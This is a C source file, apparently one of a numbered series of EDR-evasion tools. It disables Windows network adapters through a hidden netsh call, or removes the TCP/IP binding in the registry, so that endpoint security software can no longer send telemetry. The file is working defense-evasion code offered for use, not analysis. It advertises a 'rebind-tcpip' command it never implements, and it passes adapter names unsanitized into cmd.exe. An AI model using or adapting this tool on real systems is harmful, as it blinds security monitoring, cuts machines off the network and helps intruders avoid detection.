/*
 * 19_adapter_binding.c
 * Network Adapter Binding Manipulation — unbind TCP/IP from the physical adapter
 *
 * The Windows network stack is implemented as a binding between protocols (TCP/IP)
 * and physical adapters. If TCP/IP is unbound from an adapter, ALL TCP/IP traffic
 * on that adapter is disabled — not just EDR traffic.
 *
 * This is a nuclear option: affects all processes, not just EDRs.
 * Combined with a local loopback adapter, you can maintain localhost connectivity
 * while breaking all external EDR traffic.
 *
 * Two approaches:
 *   1. netsh interface: disable/enable adapter  (simpler, more visible)
 *   2. Registry-based unbinding via:
 *      HKLM\SYSTEM\CurrentControlSet\Control\Class\{GUID}\{index}\Linkage\Bind
 *      Remove ms_tcpip from the binding list, reset adapter.
 *
 * Build:
 *   cl 19_adapter_binding.c /link Advapi32.lib
 *
 * Usage:
 *   19_adapter_binding.exe list
 *   19_adapter_binding.exe disable <adapter_name_or_index>
 *   19_adapter_binding.exe enable  <adapter_name_or_index>
 *   19_adapter_binding.exe unbind-tcpip <adapter_name>
 *   19_adapter_binding.exe rebind-tcpip <adapter_name>
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <iphlpapi.h>
#include <stdio.h>
#include <wchar.h>

#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "iphlpapi.lib")

/* Registry key for network adapter class */
#define NET_CLASS_KEY \
    L"SYSTEM\\CurrentControlSet\\Control\\Class\\{4D36E972-E325-11CE-BFC1-08002BE10318}"

/* Run a shell command silently and return exit code */
static DWORD RunCmd(const WCHAR *cmd)
{
    WCHAR buf[1024];
    _snwprintf_s(buf, ARRAYSIZE(buf), _TRUNCATE, L"cmd.exe /c %s", cmd);

    STARTUPINFOW si = { sizeof(si) };
    si.dwFlags     = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi = {0};
    if (!CreateProcessW(NULL, buf, NULL, NULL, FALSE, CREATE_NO_WINDOW,
                         NULL, NULL, &si, &pi))
        return GetLastError();

    WaitForSingleObject(pi.hProcess, 15000);
    DWORD code = 1;
    GetExitCodeProcess(pi.hProcess, &code);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return code;
}

/* List adapters using GetAdaptersInfo */
static void ListAdapters(void)
{
    ULONG size = sizeof(IP_ADAPTER_INFO) * 16;
    PIP_ADAPTER_INFO pInfo = (PIP_ADAPTER_INFO)HeapAlloc(GetProcessHeap(), 0, size);

    if (GetAdaptersInfo(pInfo, &size) != NO_ERROR) {
        HeapFree(GetProcessHeap(), 0, pInfo);
        pInfo = (PIP_ADAPTER_INFO)HeapAlloc(GetProcessHeap(), 0, size);
        if (GetAdaptersInfo(pInfo, &size) != NO_ERROR) {
            wprintf(L"[-] GetAdaptersInfo failed\n");
            HeapFree(GetProcessHeap(), 0, pInfo);
            return;
        }
    }

    wprintf(L"%-5s  %-30s  %-15s  %s\n", L"Idx", L"Name", L"IP", L"Type");
    wprintf(L"%-5s  %-30s  %-15s  %s\n", L"---", L"----------------------------",
            L"---------------", L"----");

    PIP_ADAPTER_INFO p = pInfo;
    while (p) {
        const WCHAR *typeStr = L"Other";
        switch (p->Type) {
            case MIB_IF_TYPE_ETHERNET:  typeStr = L"Ethernet";  break;
            case MIB_IF_TYPE_LOOPBACK:  typeStr = L"Loopback";  break;
            case IF_TYPE_IEEE80211:     typeStr = L"WiFi";      break;
            case IF_TYPE_TUNNEL:        typeStr = L"Tunnel";    break;
        }
        wprintf(L"%-5lu  %-30S  %-15S  %s\n",
                p->Index, p->AdapterName,
                p->IpAddressList.IpAddress.String, typeStr);
        p = p->Next;
    }
    HeapFree(GetProcessHeap(), 0, pInfo);
}

/*
 * Disable adapter via "netsh interface set interface disable"
 * Uses friendly name as known to Windows.
 */
static BOOL DisableAdapter(const WCHAR *name)
{
    WCHAR cmd[512];
    _snwprintf_s(cmd, ARRAYSIZE(cmd), _TRUNCATE,
                 L"netsh interface set interface \"%s\" disable", name);
    wprintf(L"[*] %s\n", cmd);
    DWORD ret = RunCmd(cmd);
    if (ret == 0) {
        wprintf(L"[+] Adapter disabled: %s\n", name);
        wprintf(L"[!] ALL traffic on this adapter is now blocked.\n");
        return TRUE;
    }
    wprintf(L"[-] Command failed (exit=%lu). Check adapter name with 'list'.\n", ret);
    return FALSE;
}

/* Re-enable adapter */
static BOOL EnableAdapter(const WCHAR *name)
{
    WCHAR cmd[512];
    _snwprintf_s(cmd, ARRAYSIZE(cmd), _TRUNCATE,
                 L"netsh interface set interface \"%s\" enable", name);
    wprintf(L"[*] %s\n", cmd);
    DWORD ret = RunCmd(cmd);
    if (ret == 0) {
        wprintf(L"[+] Adapter enabled: %s\n", name);
        return TRUE;
    }
    wprintf(L"[-] Failed (exit=%lu)\n", ret);
    return FALSE;
}

/*
 * Registry-based TCP/IP unbinding:
 * Find the adapter's registry subkey and modify the Linkage\Bind REG_MULTI_SZ
 * to remove the ms_tcpip binding, then reset the adapter.
 *
 * More surgical than full disable — only TCP/IP traffic stops.
 */
static BOOL UnbindTcpip(const WCHAR *adapterGuid)
{
    WCHAR keyPath[512];
    HKEY  hClass = NULL, hAdapter = NULL;

    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, NET_CLASS_KEY, 0, KEY_READ, &hClass)
            != ERROR_SUCCESS) {
        wprintf(L"[-] Cannot open net class key\n");
        return FALSE;
    }

    BOOL found = FALSE;
    WCHAR subName[64];
    DWORD subLen = ARRAYSIZE(subName);
    DWORD idx    = 0;

    while (RegEnumKeyExW(hClass, idx, subName, &subLen,
                          NULL, NULL, NULL, NULL) == ERROR_SUCCESS)
    {
        /* Open subkey and check NetCfgInstanceId */
        _snwprintf_s(keyPath, ARRAYSIZE(keyPath), _TRUNCATE,
                     L"%s\\%s", NET_CLASS_KEY, subName);

        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, keyPath, 0, KEY_READ, &hAdapter)
                == ERROR_SUCCESS)
        {
            WCHAR instanceId[64] = {0};
            DWORD idLen = sizeof(instanceId);
            RegQueryValueExW(hAdapter, L"NetCfgInstanceId", NULL, NULL,
                             (BYTE *)instanceId, &idLen);
            RegCloseKey(hAdapter);

            if (_wcsicmp(instanceId, adapterGuid) == 0) {
                found = TRUE;
                break;
            }
        }
        idx++;
        subLen = ARRAYSIZE(subName);
    }
    RegCloseKey(hClass);

    if (!found) {
        wprintf(L"[-] Adapter GUID not found in registry: %s\n", adapterGuid);
        wprintf(L"    Use the GUID from GetAdaptersInfo (AdapterName field).\n");
        return FALSE;
    }

    /* Open the Linkage subkey */
    WCHAR linkPath[512];
    _snwprintf_s(linkPath, ARRAYSIZE(linkPath), _TRUNCATE,
                 L"%s\\%s\\Linkage", NET_CLASS_KEY, subName);

    HKEY hLinkage = NULL;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, linkPath, 0,
                       KEY_READ | KEY_WRITE, &hLinkage) != ERROR_SUCCESS)
    {
        wprintf(L"[-] Cannot open Linkage key for adapter\n");
        return FALSE;
    }

    /* Read current Bind REG_MULTI_SZ value */
    DWORD bindSize = 0;
    RegQueryValueExW(hLinkage, L"Bind", NULL, NULL, NULL, &bindSize);
    if (bindSize == 0) {
        RegCloseKey(hLinkage);
        wprintf(L"[-] Bind value not found\n");
        return FALSE;
    }

    WCHAR *bindData = (WCHAR *)HeapAlloc(GetProcessHeap(), 0, bindSize + 4);
    RegQueryValueExW(hLinkage, L"Bind", NULL, NULL, (BYTE *)bindData, &bindSize);

    /* Count current entries and rebuild without ms_tcpip */
    WCHAR *newBind     = (WCHAR *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY,
                                             bindSize + 4);
    WCHAR *newBindPtr  = newBind;
    WCHAR *p           = bindData;
    DWORD  removedCount = 0;

    while (*p) {
        if (_wcsicmp(p, L"\\Device\\Tcpip") != 0 &&
            wcsstr(p, L"Tcpip") == NULL)
        {
            size_t len = wcslen(p) + 1;
            wmemcpy(newBindPtr, p, len);
            newBindPtr += len;
        } else {
            wprintf(L"  [*] Removing binding: %s\n", p);
            removedCount++;
        }
        p += wcslen(p) + 1;
    }
    *newBindPtr = L'\0'; /* double-null terminator */

    DWORD newSize = (DWORD)((newBindPtr - newBind + 1) * sizeof(WCHAR));

    if (removedCount == 0) {
        wprintf(L"[~] No TCP/IP binding found for this adapter.\n");
    } else {
        LONG err = RegSetValueExW(hLinkage, L"Bind", 0, REG_MULTI_SZ,
                                   (BYTE *)newBind, newSize);
        if (err == ERROR_SUCCESS) {
            wprintf(L"[+] TCP/IP binding removed from adapter registry.\n");
            wprintf(L"[!] Disable/re-enable adapter or reboot for change to take effect:\n");
            wprintf(L"    devmgmt.msc → find adapter → Disable Device → Enable Device\n");
        } else {
            wprintf(L"[-] RegSetValueExW failed: %ld\n", err);
        }
    }

    RegCloseKey(hLinkage);
    HeapFree(GetProcessHeap(), 0, bindData);
    HeapFree(GetProcessHeap(), 0, newBind);
    return (removedCount > 0);
}

int wmain(int argc, wchar_t *argv[])
{
    wprintf(L"[*] Network Adapter Binding Tool\n\n");

    if (argc < 2) {
        wprintf(L"Usage:\n");
        wprintf(L"  %s list                   List adapters and their indices\n", argv[0]);
        wprintf(L"  %s disable <name>         Disable adapter (all traffic stops)\n", argv[0]);
        wprintf(L"  %s enable  <name>         Re-enable adapter\n", argv[0]);
        wprintf(L"  %s unbind-tcpip <guid>    Remove TCP/IP binding via registry\n", argv[0]);
        wprintf(L"\nNotes:\n");
        wprintf(L"  'name' is the friendly name shown in Network Connections\n");
        wprintf(L"  'guid' is the AdapterName from 'list' ({XXXXXXXX-...})\n");
        wprintf(L"  'disable' is immediate; 'unbind-tcpip' requires adapter reset\n");
        return 1;
    }

    if (_wcsicmp(argv[1], L"list") == 0) {
        ListAdapters();
        return 0;
    }

    if (_wcsicmp(argv[1], L"disable") == 0 && argc >= 3) {
        return DisableAdapter(argv[2]) ? 0 : 1;
    }

    if (_wcsicmp(argv[1], L"enable") == 0 && argc >= 3) {
        return EnableAdapter(argv[2]) ? 0 : 1;
    }

    if (_wcsicmp(argv[1], L"unbind-tcpip") == 0 && argc >= 3) {
        return UnbindTcpip(argv[2]) ? 0 : 1;
    }

    wprintf(L"[-] Unknown command or missing argument: %s\n", argv[1]);
    return 1;
}
